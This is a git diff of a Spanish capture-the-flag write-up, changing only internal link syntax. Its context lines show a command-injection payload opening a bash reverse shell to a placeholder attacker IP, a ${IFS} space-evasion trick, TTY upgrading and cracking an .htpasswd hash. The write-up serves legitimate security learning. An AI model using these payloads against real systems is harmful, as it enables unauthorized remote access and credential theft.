@@ -154,7 +154,7 @@ Priority: u=0
 yt_url=;/bin/bash -i >& /dev/tcp/IP_KALI/4444 0>&1;
 ```
 
-Pero debido a los espacios no funcionaba, por lo que sustituí los espacios por la variable `${IFS}`, aunque seguí sin poder ejecutar correctamente el reverse shell (***[[#Problemas del reverse shell en la URL]]***).
+Pero debido a los espacios no funcionaba, por lo que sustituí los espacios por la variable `${IFS}`, aunque seguí sin poder ejecutar correctamente el reverse shell (***[Problemas del reverse shell en la URL](#problemas-del-reverse-shell-en-la-url)***).
 
 Lo siguiente que probé fue crear una nueva reverse shell dentro de un archivo y descargarlo desde el servidor (como con el ***SSRF***, con la única diferencia de que utilizaría `wget` o `curl` para poder descargar el fichero en el mismo directorio en donde se encuentre configurado el servicio web o para ejecutarlo directamente en memoria).
 
@@ -230,7 +230,7 @@ Al ejecutar esta secuencia estamos alterando la configuración de la terminal de
 	- `-echo`: Desactiva el "*eco*" local. Cuando escribimos en nuestra terminal, vemos los caracteres em pantalla porque la terminal hace `echo` de ellos. Al desactivarlo con el signo menos (`-`), evitamos que los caracteres se dupliquen o se vuelvan locos en la pantalla al mezclarse el tráfico que enviamos con el que recibimos de la víctima.
 
 3. `; fg`
-   - `;` ***(Punto y coma):*** Es el separador del que hablamos en la sección de ***Explicaciones [[#Explicación del *payload*]]***. En este caso permite ejecutar `fg` inmediatamente después de que se aplique la configuración de `stty`, todo en la misma línea.
+   - `;` ***(Punto y coma):*** Es el separador del que hablamos en la sección de ***Explicaciones [Explicación del *payload*](#explicación-del-payload)***. En este caso permite ejecutar `fg` inmediatamente después de que se aplique la configuración de `stty`, todo en la misma línea.
    - `fg` ***(Foreground):*** Trae de vuelta al primer plano el proceso que habíamos pausado en el paso 1 (la conexión a través de Netcat).
 
 Al volver a entrar en Netcat, nuestra terminal local ya está en modo `raw`. A partir de este momento, ya tenemos ***auto-completado con el tabulador***, historial de comandos con las flechas del teclado y control de procesos con `Ctrl+C`.
@@ -249,7 +249,7 @@ stty rows <filas> cols <columnas>
 
 ### <font color=red>[!]</font> `export TERM=xterm`
 
-En este punto ya tenemos una ***PTY*** real con la mayoría de las funcionalidades de una shell. Sin embargo, si tratamos de ejecutar algunos comando como `clear` no podremos (***[[#TERM y `clear`|Explicación]]***).
+En este punto ya tenemos una ***PTY*** real con la mayoría de las funcionalidades de una shell. Sin embargo, si tratamos de ejecutar algunos comando como `clear` no podremos (***[Explicación](#term-y-clear)***).
 
 La variable de entorno `TERM` le dice al sistema operativo de la víctima qué tipo de de capacidades de pantalla tienen la terminal del atacante (nuestra máquina).
 
@@ -280,7 +280,7 @@ Iniciamos el acceso dentro del directorio `/var/www/html` en el cual tenemos var
 
 ### <font color=red>[!]</font> `/var/www/html/admin/`
 
-Dentro de este subdirectorio tenemos una *flag*. Y es que si miramos las tareas del CTF, hay una que nos pregunta: "*Cuál es el usuario requerido para acceder a la carpeta secreta?*". Para poder responder a esta pregunta debemos de ver el contenido del archivo `.htpassword` en el cual encontramos el usuario y su contraseña en formato ***Hash Apache MD5-based password algorithm (Apr1 o apache MD5)*** (***[[#Apr1]]***).
+Dentro de este subdirectorio tenemos una *flag*. Y es que si miramos las tareas del CTF, hay una que nos pregunta: "*Cuál es el usuario requerido para acceder a la carpeta secreta?*". Para poder responder a esta pregunta debemos de ver el contenido del archivo `.htpassword` en el cual encontramos el usuario y su contraseña en formato ***Hash Apache MD5-based password algorithm (Apr1 o apache MD5)*** (***[Apr1](#apr1)***).
 
 Para contestar a la pregunta tan solo debemos de ver el contenido de `.htpasswd` en el que veremos el usuario. Sin embargo, podemos ir más allá y crackear la contraseña *hasheada*.
 
